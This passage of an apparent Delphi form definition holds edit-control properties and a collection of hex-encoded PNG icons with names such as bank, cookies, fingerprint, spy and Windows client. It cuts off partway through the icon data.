          RightButton.CustomImagePressedIndex = -1
          RightButton.CustomImageDisabledIndex = -1
          Transparent = False
          BorderKind = scebColorFrame
          CustomDraw = False
          FrameColor = 4599078
          FrameActiveColor = 4599078
          Text = ''
          Color = 2428680
          Font.Charset = DEFAULT_CHARSET
          Font.Color = 13017238
          Font.Height = -12
          Font.Name = 'JetBrains Mono'
          Font.Style = []
          ParentFont = False
          TabOrder = 3
        end
      end
    end
  end
  object ImageCollection1: TImageCollection
    Images = <
      item
        Name = 'send_letter_24px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D4948445200000018000000180806000000E0773D
              F800000006624B474400FF00FF00FFA0BDA7930000023549444154480DDD95BF
              4B5B5114C7CFD3D8CC05910A56A5FF80121C3A54DA459A08820E82FF4877E78A
              8DBAB55397428716EDD4B5B58A43D4E822286220148B2808DD029AE7E7FBDE0B
              DEFB92A8B42EAD7C3FE7DC7BCEB9E7BE1FD717B37FFD2FB8E906C230CC929F86
              29188687209D63CAB00C9F8220A8E15BAAED063457E3D7AC1A34B353F8015590
              0630A3D00D1578C5269FF1B78BC6195804A98CC943477A25B14E28C02E48454C
              67BAAE694ED112486F3099A682544035B000D25C2AED4FA99801E9E6427F5934
              63912EA88E9F88026943220B95300C4BD074ABC4BA611DD640CFDE6B414C8FAC
              8C3F802E2FA909C1C6D5BFD4DC85DC63D8838B048DFBDC1A8DC98D83A403A2D0
              35443FC22FF05E28F32150FC0CBF95A0B16243D71DCCC8E92E4EF01F1A71B759
              8EE0378E5B1DEFEA0B133DB23CFE7782C63A00CA118AC5DA4B46DF2107915414
              0D30BDF013D29A35B30D16EF73650CCD186F327EC6E429A45525A00BC0996522
              1B9B2076BEA5D97B6BF1477C9FB0C0B55787933A66DC077FAB7E1AA817CECCDD
              609BC80B6EDD8D11BABB58AB77F59C155B10C96DB642E4118CC19F4A47BC87C5
              EA8573C4EE0FE010F40275254E361E927B076FE3996F89EB8896F107D0E56793
              19894990EEFF5391EC61749F0749DF16F794354A3C4F61061640BAFDC2A8D2AD
              2EE2A51D4C1EDC77156D404C7505FC2E48454CD3A36D79F6D581627D4F1A3F38
              67C456A10AD2006614F4D1ABE0DBFEE0B4DD80457A5C59FC141460049E807484
              29C15758E19FAE86FF4F75053A48A2F98755313E0000000049454E44AE426082}
          end>
      end
      item
        Name = 'bank_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA793000001584944415438116360A0
              103082F4C7CD29FB0FA249C58B52BA1859609A625CDC614CA2E8257B7682D531
              81491CC4F99BD7192EDDBA854316220C7701840B217FFFFDC3B0E7F87186DB0F
              1F32FCFCF38BE1F4D52B0C515EDE0C9CECEC100548245603CE5DBBC670F3FE7D
              062733330656565686E76F5E33FCFBFF0F491B8289D5801F3F7F3230303232C8
              49493308F0F232682A292374A0B1B08681B1A616031F0F0FC3BCF56B19761D3B
              CAF0F1CB17346D082E560378B8B919E2FDFC186C0C8D19EE3E7EC4307FC37A86
              97EFDE227421B1B01AF0F7DF5F0666266606335D5D86E4A0100666662686AB77
              6E23694330B186C199AB57181E3C7BC6202D26CEF0F5FB37869F3F7F3108F2F1
              237421B1B01A202729C5F0E2ED5B866B77EE3030B3B030D89B9830E8A9AB2369
              4330B11A202922CAE0EFE0C4004A48CC8CCC0C7A6A6A081D682CAC06C0D418AA
              6BC2983869B801B0B48D5325AD2400D8895AC8528CE62D0000000049454E44AE
              426082}
          end>
      end
      item
        Name = 'black_ski_mask_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA7930000022D4944415438117D51BF
              6B1441147EB3EBFE38CCEDED2551921841499326A29D44D080204454442BC1C2
              229E9DA24520D85C93DAC33406FF8214160A118BA044114B1BBB54C21DF134DE
              EDEDDE5D76EF76669C379B19736A5CE67B6FDEF77DFBF6ED0C01187CEE94CBAE
              13171F12832F700263994AB68193E77604959595FB49C6659164298B0B8B4F27
              2D8BBFB75C67CCF38B39CB71A4D04F12088366B71727DB00F4C2B3E547352988
              A01B944AAB16198DBF7823C529AFE09B42FB6B854140C346736BDC6ECE94CBE5
              140D060604391ADFB61D7BE2A097D1E3F9BE69D9D6642D29DCC21AA11B9840EE
              E67D7F08C9FF21EF17870CD328298F6E40199BB15D57F1076627E702E1704A19
              0EA90DE790334D033EBC7905ED5603C68F9F80D3B37380CFE78FEFE05BF52B78
              FE30CC5EBA0A8CF1C3C823F404C4205D463970CE8481A1B60F44728C659AF076
              94A82710D7F1234D7BF9F3F3D795A6F399737380402249622040EAB847FC9E00
              6033DE8DFFFC347A06D0131EC6F9A622F50429E76B9D30BC29AECA43F1D3C63A
              043F77700BC5D12370F6E265B9EF44619B33B6260B11F404C1D6C406A5294DFB
              7D4183380B0046A9842444402D1596636EEBAD28E52232EE85D2E3CA6B7F7864
              3E5F28EC3183290A5AD06A36D657971F5C518A9E00097138D35110C813C77A3F
              F006A2A089D4340605DDE0DED29317E2DF4ED23485EFD51AECB6DBB291B873E8
              4611D4AB55A0E2978467AAB45479A91AE843E4003714D9EFF760A75E57E53F32
              BFA6C85F8C0EE1CCBC6ABE040000000049454E44AE426082}
          end>
      end
      item
        Name = 'cookies_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA7930000029D4944415438116D535F
              48535118FF76CEB99B6E6E6D9366FE59B3095A50692FF5526A119A0F410FA541
              E1830F458841F51412F822411441420345A23F5096E1635844443D14D18354A8
              B4742EF4CE7F9BDB745E77EF39B77B4E4D36DB85DF77BFDFF7FDBE8FEF9CFB5D
              1340FEE779CF19730C1217906EEA628C557015C6E8B7CE681F8B44FB2FF67F55
              79CCC4CD5604BA8F954B92F4CEE37695EDDDEDB5B91C4542124DACC18F8999B5
              F9A5F8ACA2D0A35DB7DECCE53408F4347908852B88A06B3A0309211314D90A21
              1955E0D4C98350609144A36F9361FA7D3C34958AA17D44440C13E86E3A875418
              A8F479A49AAA0A62370A8D30245653F033148191D14FA02619208AE17CFB613C
              BFB8522AD37827E6A2C08DE65689E0C196C603D6EAAA72642DB480715E01EE7B
              4B8BA1ACC40D217901A8CAA076BF0F6C851673585EDC89EE5D6FD98E401F3CD1
              506775BBEC303CF499F7FC0FC54E3B3437D481C5896123AD42B1B3085495FA91
              85E8576B7695995DDBFE5ED4E9B64339C5D90DDD4691DFEB8189E02C8C0C7F11
              3A84119CF5FB7698397BFCF0033C79F491BB9BD8DAB0D25B02617909EA8FEF01
              42F014D13456EAB05B45814E75006440B0FCC6656813C975181B0FAD19F7719F
              64CBDA3BEAB3698ECF8F929946D775588E26E65C92A31F1182E4B8B12039EA3C
              24531C4BA68CAF6352D715D6D8DAF3228D34CA9E0643B2925D93EF2E32F9E0F4
              9CCA34769B6F218FA134C5777FCD44B4587C9573017E173A63C2E7868FCFDFD1
              9555980A2F28694AEF70CE2156592C12460F9A8FD48A5DE089AD585E49C2EBF7
              63295563ED977A475F66F2A2012762950106AA2A4B4CD5FEF202A7C3C6C3C027
              9B9C9695E970C4989C7674F6BE1D12897F66B301E7FC67C214BA30C16DAAAAF9
              784C92C88CA6B2671B14F55DBEF96A91C7B2F107E18A0B933091382000000000
              49454E44AE426082}
          end>
      end
      item
        Name = 'detective_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA7930000029749444154381195926D
              48535118C7FFF79E7BB7369D3AD2B9398D9541A03695504A225383A8A03E571F
              0A56FAA11C8441855FD627E94529A42211254882BE89D8870A4508292D62662F
              94C8D09CCE175C63D379DF4EF74CB4291179799EE79CF37F9EF3BB9C87870356
              3F9FEFB941CD88D40A3CEA6595CB65AAC86352D6B4D659B3D6D6565727336DB3
              734C686C79E21479B9DF65E7732ADD2425DB9A9031B34831E057638159756A39
              CE57DDBEE609B2FA64E77CBECE6D9A551DAD710BAE43C5842427D7F6037E45ED
              1BD1C617B9D8DE56AF77654D67AB20A7AB977766F20E7639FA2B8CB1AF5F109E
              9B663958B31CC82F284465713AF9119473D4D9944B7AA245F775130C0417AB4B
              79F3F8B7CF980A4C60C97E0ECF820238FD1567F25444063BE174B9505DB227E5
              699F7241BFB901C04B325C4BD37E84820B283B790F5D6F09663EF5A2B6C686AE
              7704E5A75A311F8A201E1A812461970ED8603C3B717A20C4A0FF556F010528D5
              70B3A5031AA5A09A0A5591744D2FFA8BF106110193A31899D9160C75D7E37479
              1CB6A213C82A3A8EB365710CF75C41B6733B4C76378C02C637330449A60FFA3E
              6A4D9E6385669BC3A937B117E71D9389BA4C390FF91515484D4B47FB0B796945
              C5C3442229081171F9F1C4BCD9FBFA83EA3AB22F8394ECAF484AAF6E5FBD5731
              B9404568A69E55E54F64CFC7DA20EDB0F3F62A37B1E466F1D05B819F731AFAFD
              4A3410A2465986C81332A1C8DA81E4814A00188F8DF28A25EA318AD42B497437
              D30C22371697713F4E946E3315DF0884B814555DA05439D8D450FB9DD5AC03D8
              E15F7EF5CE239B8198868DA2902B4972448176F85683C7FFDF00066F6CEEC8D3
              C00D5952CDB6683416A31A3DBA250083DCB8DB51C07174D06AB5A62D86C3F35B
              0630C8F5E6F65202FE25786EF4378747FF49AFC33A030000000049454E44AE42
              6082}
          end>
      end
      item
        Name = 'fingerprint_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA7930000034949444154381155534B
              6C555514DD7B9FFBFA3EF5496DE90334264465828504D2816D696B478D1F62B0
              948F84808604DA1A201A313144481C1027A631B6403531D144838F8F4AC49AA0
              A52D0E6A3AE1179504081094560AB4AFBC5B5EEFD9DB75310CBCC9B99FBDCF5A
              679DB5CE65A2FF5F033DED8F88D806515DD6D87574DB506FDB05361223BA6C4C
              DF94BB52BE76EBF1E243943C7C899F43FBDB5A1DEB25266B26E21FE25A3023B5
              9168BB097F85C99B8A3E7175B067F5AB712F1E1CDFE201F09B64B44B4C5EF3E6
              8585B7D37F440EFD082A06BC936EF23E25C25F90596F53E7D17D0F08867BDA56
              425E37395B419EDF02600D9B7DC8C6832614B2C9E32AD602D00E28FB7256B53B
              21FC3331EF9681CF37A700EE2196F55E3589E2424926EA9424A742C700685FD1
              953FDDD471F8036F5243A4F50991B799790B165A16B8626123098F3475E47F43
              816CEFDEB5A773E74EB2901AD1DA20E43FE27A3C986D9137F70A7C1AF12C5F3F
              BF2DFF2E0FF5AEFE9159FBC8B87AC6C9A132B57590BF2AF0B4D33BEA03490D31
              9D73E2DFF0EA769BF2057017A1B4A1B1F3C806184B4B398A4630F1BD20A26A80
              B7B3D29EC8D17E98FA1353F269ECBDDFFBA00F5E7C02159B91CA09256A7EA00A
              39DFAF9A2BD9895B3AE5D3D90A17162633AEF458D1974D20C2CA28ADFD3E35D1
              EAC2AADB4FA6B395D7C3C29DAA71993391D3E9C6F125A95841F8F7789405DB54
              D9CCE4A3667CE7EE6C904684D3F7CB8372A8A849FAEA0CFAFF5C9BBEB700FDC9
              BBF3A20A7C4F0D2F383B2F26184F91CC479E6370793E24FE95946021DCBFC816
              2D82FC3F4B257B16FD510AAC5ED87EF5DED58178C4227AD1BDFED2E20625BB8D
              249E8031636800AB19ECB780F74A10DE14E2A710F519527E19F3F2C6B6095EED
              C1617B5F20691427ABCEC886B15A33CEC361303432F1B7002F2576DFA1B72A48
              C8217CB730BBDFA126478EEB9B3A8F3CC7A70EB4D789FA7DCEDC4ECFFA3D0C7D
              06869EC5766A5BBAF2D366C4C307DACEB0EA2E63598248D7B9D9608D0FA2E344
              340832A2D1832B33F11F8644CE43EE3BC6D6AA4A5798EC061435E0F49D84AA8F
              334E9617D53E83D28A543ABB319C995C1C9B4831186CA8D3A7F0A385453EC24A
              AD25B301A4F1C2CDB9AE1FCD83F74C737EECD67A909D0FC3425F73C7B15FFE05
              B5DE805E9894FECB0000000049454E44AE426082}
          end>
      end
      item
        Name = 'hacking_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA7930000014C494441543811636018
              68C058D13DE73F258E6001694EF10A035124E339DB56313091AC0B4D03D80520
              B1DAEE3A06297129063525550619295906312111063E5E7E9014C3A7CF1F195E
              BD7DCDF0E4F913865BF76E333C7FF98CA1A9B4092C073780859999E1D6C39B0C
              779FDE65F8F6F92BC38F9F3F197E023148153B3B3B033B073B032F3737C377A0
              98A8802848188CE10698E89B301C3A7388415E510E2C01223E7DFACCC00864F0
              F2F1024908BA75FD368329502D84C78008033B733B86F76FDF337C78FF91C1D4
              2D90E1DEEDFB0C4F1E3C05E2270C8F81B4997B20C39B576F183E7FFAC2606B6E
              0BD38F3080978797A138BD98E1F993170CD31A6B18341435187AEB7A187A6A7B
              1914A51519A636D430BC7EF996A13CA79C81879B076E00381D0C7C34821204DC
              4DD4628092F8B693D7FE8330888DCB5C502CA1C8E1530C52D8519A82A107244E
              360600E20A724ECB154B1D0000000049454E44AE426082}
          end>
      end
      item
        Name = 'heic_filetype_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA7930000015E494441543811636460
              8000BFAAADFF212CEC242323E3898DAD5E96E8B28C30019001B6B6D6302E0A7D
              F8F051066101CEFFEF3EFD38B6B1C5CB0659920999838F3D25D79651849FC3CA
              BF7ADB396475441BC0C5C1C23031C78651989FD3C0AF6ADB1198212C3006211A
              68334C09C8DB70BF1265007AD880C204661A8A01825C4C0CA0A810E46662F8F0
              F51F83A40033C3D3F77F1984789818EEBFFEC3202FCCC2F0F9C73F985E308D12
              06B24005B2422C0C562A1C0C7240B6A4000BC33FA08920BE8E341B83A6142BC3
              5F201FAC134AA0B8002466A2C0CEC0C30EF2260383043F3303171B840D32F0F4
              FD9F0C1FBFE17101C880330F7E32BC832ABAF4F817C3CB4F7F41C20CDF7EFD63
              10067A05CC412250BC0032FDE3F77F0C8FDFFE6100D14AA22C0C8A400CE2836C
              0785818208AAA351780F811A41863F82D20FDEFC0171C1010862ECBCF21D44A1
              601417A0C810C9A1D800142F202710221D40B932005E99674B34F4BF26000000
              0049454E44AE426082}
          end>
      end
      item
        Name = 'hips_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA793000001304944415438116360A0
              1030A655F6FFA7C40C1690E6990DFE208A649CDEB091016C00BACEBD4BF318FE
              FDFD8322CCC4CCC2E01C3D09450CC4C16A002B1B078399A32B03072717480DC3
              8FEF5F194EEDDF0366A3134CE802203E37BF38C3D74F1F414C3006B1B9F844C1
              6C7402AB0182121A0CAF9F3F83AB7DF3F22583A0B8069C8FCCC06A80948A15C3
              8B270F197EFDFCCEF0FBD74F86178F1F3248A95822EB83B3B1860107972083AC
              BA03C395D32719989898192495CC18387944E09A9019585D0052A0A4EFC3C0CE
              23CDC0C229CEA06A1C0C12C28AB1BA00A49291919141DB3A818110001B004A10
              841422CBCF2C156148EF7E0316C2E905B02C0E02A619873444189447361CBCF2
              1F84416C882826C9882CD4D0D0C0F4EC27FF69A0981110634367A4D83F9A03D5
              FDC3264996180098CD4AD5D6629EA20000000049454E44AE426082}
          end>
      end
      item
        Name = 'info_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA793000001F0494441543811A5533B
              6FD440109E1D7BEFCEE09C29FD0852CE08240A9428C01F8006A1806882902829
              48113ACA142E282828A922EA08A542099CA8F803BC4EA2438293389F4389AD0B
              E7F3ADBDEC5832F1112290B2D6E7FDE69B87BDDA190670B08220C0F793CB7779
              93DF83425E288ADC40D4C600EC9310D9B3E5C6BB2D15531C64284F65DCDAE89E
              41C4978661CCAB655AA7DAC0D4234142FC2381C1201C8DD3F1B72C13375E3D5E
              F95AE531222B1BBB6739F0B71D7FC1741C5B23ED6FD88BBE8B7EBFBFAF8A5E7C
              F1E8FA178AC1D5D56DAD818DAEEF2FCCFD99DCE4657D8A2BE1B8B6DEF13B2663
              D8554741127172CEBC63B45AB6EDD8A54022A1A592D7AFB48176B22BD04754BC
              FB21BB749B34E49A76DF9BF74C32EA48A7129EBE4980F6BA4EDC3BED99BACED7
              88632E8B45CB6A139FC1CDA513F0E0EA619D822CCB0229619138CA5C9EE45C27
              3E839DDECF19BB6E705D0775C5E55F23D3D8FE742AEAFE7FF2A910A0FA634481
              880C7B719C10FF6FC4710C8CC98F948022CF37C3302CAB9150E1E135ABA4D55E
              1AEAA5CE0EC3C1702484D85426E8CDCFA3E7E9792D88A23DDF759DDF57F9E475
              4CFE435071F9384D23D5D6DB3BCA5B76CA713AB12CA00A417D163CD735E7D4D5
              B69A0D482719244902C3303A7A16A80021A84DA314C5525EE496865ACC107B47
              4D23E51D0BBF00EF37CA7437EFD5940000000049454E44AE426082}
          end>
      end
      item
        Name = 'information_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA793000000A5494441543811636460
              C00E026BB6FA3030B2CC6560F8CFC0F89721695D9BC7566C2A59B00942C49817
              E8E9E90833FCFFCF70E9F2E5050C0C0CA2408C81701AF09FE13FD3FFFFFF80FA
              FF031DC1C888A1132A80D30046867F71972E5D59C4C8C8F89FF11F433C543DF5
              290CA7F9556DFD8FCD9A4D6DDE186A41EAB00A82244006D9DA5A83980C870F1F
              65C0650013580505C4A8010C0CC3200C3012122801E14B16E8090A00F9142C5B
              13C2550F0000000049454E44AE426082}
          end>
      end
      item
        Name = 'lock_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA7930000010C494441543811636460
              C00469E513E51898FEF5333032D881641919180FFFF9F7AF6C6E47D11D101F19
              332173406CA8E6530C0CFF4FFF65FC6B02C2FFFEFD3FCDCCC87834ABBA5716A4
              0619B32073C06C90CD0CFF27CC6A2FEA00F321447B5A651FE3EF7F4C7D406E28
              10C311860B8032AE7FFEB22E02D228E8DF5F96458C0C0CAE2882D8386995FDFF
              B18983C4B0C931812428C140573130CCA876F36566669CF3FBCF5F31620C6361
              617EF5FF0F43527ADBCEADE04064666298EF6CAD272C2E2A408C7E8617AF3F88
              ED3D7A790103038328D880DF7FFF092B9AEA01F9C421250539869D07CF8B8054
              830D0031BE3D7804A248C67003B880A692AC1BA8016EC03070C1C235FB813E1A
              000400E8E9520CDE4E91AB0000000049454E44AE426082}
          end>
      end
      item
        Name = 'mastercard_credit_card_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA79300000108494441543811636018
              68C01858B763CABFBFFFD2FFFFFFCF428A63181919FFB0B0B04C63F9F7E75F86
              B98529332B2B2B29FA197EFFFECD72F2E4E92CA6FF0CFF49D60CB2096421C8D5
              8C660EBEFF4102E462267235C2F4B148586530D8DA5AC3F824D1870F1F658087
              7C89073F56CD3D3B3E62158709C20DC0A750F1E02206F1CB7B19940B7D1904F5
              78182EBD926738F458136C0651612079712703CB8F2F0C92DC0C0C1C2CBF190C
              C41F30C00051063CD777074536C3F3AF0C0C7FFF31335C78A9C000032C8C0C8C
              7FFFFCF9C30C4C5530310CFABE7D1C03081FFD0D943A0DC440F4E7F76F06706A
              6462619A71E2F8C94C606220CA3540BD60C4C8C0F08F8595751A9833A004003A
              654D5A5A5244250000000049454E44AE426082}
          end>
      end
      item
        Name = 'museum_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA79300000101494441543811636460
              C00E563584B2BDFDF5319B998531EFCF5F868922AC7CD3C21A56FF4257CD882E
              D0D0D0C024FEEB681C0B2B73B7949810A7A69A0CF7F55B4FBE3E7FF5EEFBEFDF
              7F4B5FB2592F02AAF907D30737E03F0303E38C5AF7505626C67E31617E1E537D
              153E3E5E2E983A864F9FBF319CBE78E7D3ABB71FBFFCFEF7BF30A379E76AA0E6
              FF40CCC030ADC6C5859599652A1F0FA7A4B9A11AAFA8101F5C233AE3F5BB4F0C
              27CFDFFAFCE9CBF7E7BFFFFEC9861850E5027400BA52E2F84C2065596D7BC006
              C5873882B80CC4D2207D6003C0BAC824460D606018F8306004C5DE340A12120B
              C8001086251E109B58BC70CD7E06B801200EB11A91D50100821D577D67A3ACBF
              0000000049454E44AE426082}
          end>
      end
      item
        Name = 'processor_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA793000000ED494441543811AD923D
              0AC240108577A39DAD9E40AB1CC014FEDB58899EC643781AC5CA4634A6D10358
              E909B4B534A36FE08595842C82819799DD37EF632031E69FCF335E0878BE8A19
              CAB289C6B3C4A4694709BC2CAA22622BD5E4B45BF56157F182E413AE37436333
              246EF31231F671BBF4E80468B832C2B3C900578582871998590607A83D9C4AA3
              15A2F5EA7EBD98F37EA3BB7E6DE04D3A03DC4001B5FE52698EEF6D99510069DE
              9433C08C0248737C6FCB8C0248F3A69C016614401A7C7C2AD422B91E330A200D
              A1F5F6805228D763C672321ACD8F22AF2ECF65D506417CDAADF37F1CA9BE5A06
              FFD97B0304936EA25FCCB1DE0000000049454E44AE426082}
          end>
      end
      item
        Name = 'spy_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA7930000033049444154381175535D
              681C5514FEEE9DBF9DDD4D9B34491392ECA6C936A90D9446B4887F9817511F02
              C627698BF445A868908480229606C11614125BFF1FF445A48552518220120CA2
              49C5749BB6D0E67FB3C93609E966B389D999C9FCECBDBD33B2B50ACE9C3373E6
              DEEF7CE77EF7CC25C0BFAFEEFEF3BB18C3952223F512253300E7ACC80F488464
              4CC77CE2EB0FDEDA7E30437EF0C38FBD22F9B0BEAEB6B925D11CDADCDC3A4225
              8A682482D9B9797575E5EE59817943F87D23F72311F4F40CE83B6129DBF1CC53
              114DD3C4C83F6659167EFD7DAC9093F39597FAFB9DD20C2D05AFBE33D86EE8E4
              7CA42CAAFE37D9C7E8BA8E88AE87F638E5E77CAC3FE63B39F9F6E03EA2C81709
              2187A291B0C218531E3AD01A2C5B53557071DBB60DC33431353D074A896B1886
              CB396E780E7B59A68A34D2D4188F27124D549020736719A9541ADB85021CC716
              4508544154168D221E6F40ACBE4EE19C2B73F30B8FA5179746645140E4FDBD15
              22403CD610B8C8FC5F13049028158BE344665EB123B590FE766171A9BDA6BA5A
              ADACDA23EF12D5145155D3D480C4B61DB88E83BF0A0672EB396F2D9B7584D46B
              45971F13A53979EDDD8FFB44BBFBEBE9A45E501A49CE504088D85F22A67D0A21
              58FC0DA80ABB88BA69BECCDA4C067EEA8B336F7E445E3FFDC9053D147AF19187
              0F879CA96F10629BF86EDCD70EBC77A20596C3D0FBD96D08469CE8D0C1F45AA8
              2D4771353951B0AC9DCB72D1F3460DC3ECCCE7B75875E205BA99FC145FF53DEE
              E3FDDA810FBD7F048C715C1C1A43F9C157B09A5D67A66952C6D9B874F5B79FFE
              7CF4E96787EF66735D2E429A62A529730BA8DB5B1124971EE337E791B5C2485B
              3127BD98D900BCE7BE3CD3FBBD100AB06C6442519475555365BBF6794CDCBE83
              B1E42CAC1D5BB883D1E40C6E4EAF82C7BA10D675BFDD193FC7270FCE02ADDA39
              E7B9B4B562F76E549437E2D21FFBB1BA95C24C6A456807327919CB6843574333
              948DBC2CFA7F1895D68020E80E0858B1F8B9D0934E5EBFFE126738146B6DDF9E
              9DA47B7F995C08DAD0B82FC19B0EB6E57E1E1E89489274CBF5DCCB60F8511020
              00F841C9FD0355D0C8938A2675E6D6D68E534A786575CD05DBF67E88DA7C7470
              B0D72A61FDF73D569A5EB22F518F320000000049454E44AE426082}
          end>
      end
      item
        Name = 'system_information_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA793000001024944415438116360A0
              1030A655F6FFA7C40C1690E690743D1045325E33F3120313B1BAFEFDFFCF0082
              E8EA8932E0CFBFBF0CFBCF9F6578F8F225BA7EC22EF8F3F70FC3DE73671984F8
              F81914C425081B70EAC67586779F3F8315826C3E78F10283102F0F83818A0A58
              0C9DC0F082B48808D0C6330C4F5EBF02D2671944F8F9194CD5B5181881105D33
              888FC50051067B3D0386A3572F33880B0A31E82BAB82D4E1C42CD864C4040519
              BCCC2C1978B838B149A388613500A482978B0B4411C46003400982A04A240533
              4B4518D2BBDF804530C2002C4A808069C6AB0C9447361CBCF21F84416C5C8A19
              D125522BFB7701055DD1C5417CA0F8D999ED85262036D5300081C1488D95475D
              320000000049454E44AE426082}
          end>
      end
      item
        Name = 'system_task_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA793000001274944415438116360A0
              1030A655F6FFA7C40C1690E6E2CA02104532EE6D9FC0C0844DD77FA09BB6ECBB
              CE00A2B1C9238B6135E0E485470C074FDD673879F111B25AAC6C2674D1EF3F7E
              33EC3A729BC1C7499361D7E1DB0CDF7FFE465782C207874169C7361441533D19
              067B33458697AF3F33EC3C788B21C04D9B61FDAEAB0CC7CE3D44512701E4810D
              E8AEF00232319197A30643CFEC430CD212FC0C17AF3F67A8CF7361E0E162832B
              EC6DBF853D10612A408A3DECD418566DBBC4E061AF86A219A606EC0218071B6D
              6E20CBF0F2CD1706737D596CD20C040D60646464F077D5C2AA192448564A9C59
              2AC290DEFD06A41F7F1880556021609AB1482184407964C3C12BFF4118C446C8
              A0B21851B90C0CA995FDBB8082AEE8E2203E50FCECCCF64213109B6A18008FEE
              55D792D37EC70000000049454E44AE426082}
          end>
      end
      item
        Name = 'up_squared_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA793000000E649444154381163EC2E
              5DF89F814C50DA1DCFC802D22BA56100A248C2CF6E5C00AB6702931410B43380
              8B9B95C1D14D910144E373205617F0F0B231B8F9A83048CAF032B87AAB3080F8
              B80CC13080978F8DC1C54B196E33370F2B988FCB101403B879D8181CDD95C09A
              BF7DFDCDB07FD77D866FDF7E83F94E1E4A0C20797497A0186069270B762E48F3
              DEED77199E3FF9CCB077DB5DB021201780E4F11A70ECE0238617CFBE30ECDE7A
              87E1F3A75F60B5207AF7963B6071903C581089002724181F64F3BE1DF7605C38
              FDF5CB6F066CE22005285E0009908A07DE007018C03206A9CEA78A7A00E0B745
              E8602EAE870000000049454E44AE426082}
          end>
      end
      item
        Name = 'upload_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA7930000007F4944415438116360C0
              03E2E6949583301E250CCCB824E3669735303032B400E55DF47DAD192F6E3E7A
              80010B60C622C600D55C0F97636470C065088601189A61A6E03104A6048306FA
              FF3F08634820093021B1C9628E1AC0C04071189015F254D5C44828A110B28D05
              A420C6C51D44918C97ECD9C9003600C4205937540300C41223AEC9371A710000
              000049454E44AE426082}
          end>
      end
      item
        Name = 'video_card_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA7930000016D49444154381163A8E8
              9EF3BDA27B4E07039980E90FC36F79A0DE0220260B318274015DF0FF99E02D10
              9368CCC8C8F89B8599A98505A623C6C51DC6248AFEF6F307EBFA23076BE00680
              74ED5B7D1F44C1B153A822C3DFBFFF18F6AE3DCE70F104C4857A166A0C2EC196
              0C5CEC1C0CFFFF33B0A21800D789C4D8B7E618C3C5E3771842A31218DEBF7BC7
              B06DE31A0626A0BC6B983590646040310064235814893877EC2683859503C3FE
              BDBB8036FE67F00D0967D8B1791D03CC00906148CAB131FF33282AAB30B0B2B1
              3130313131FCFEF9136C104C258A0BB0858191B526C3E2B933184C2DAC1964E4
              1418D6AF5ACA60E6A803D38FEA05B82812C30918603F7FFD66387BE218C3D9D3
              C7184C9D74189C822CE12A505C802D0C989999187C621CC018AE0BC8F80EF40A
              1323D32FB8014BF6EC040A138F8009E92F2B337313580728258218D3AA5CFEFF
              7FB7180583C490E5607C901808C35D00E280F0F49E85200A2BC629077301565D
              B41604002B9782AF6B6AB9580000000049454E44AE426082}
          end>
      end
      item
        Name = 'windows_client_16px'
        SourceImages = <
          item
            Image.Data = {
              89504E470D0A1A0A0000000D49484452000000100000001008060000001FF3FF
              6100000006624B474400FF00FF00FFA0BDA7930000010C4944415438116360A0
              1030A655F6FFA7C40C1690E698FC021045325E32710203D8006C3A7F7CFFC6C0
              C1C9C57074F7368647B76F323C04E28AFE19184A310CD8B4782EC3BD6B57199E
              3EBCC7D0BD6C03C3FAB9989A904DC130E0D0D68DC8F204D91806F4ACD884A209
              9D8F2209E460185012E1071486209066743E44064132219810969DB73F838CA2
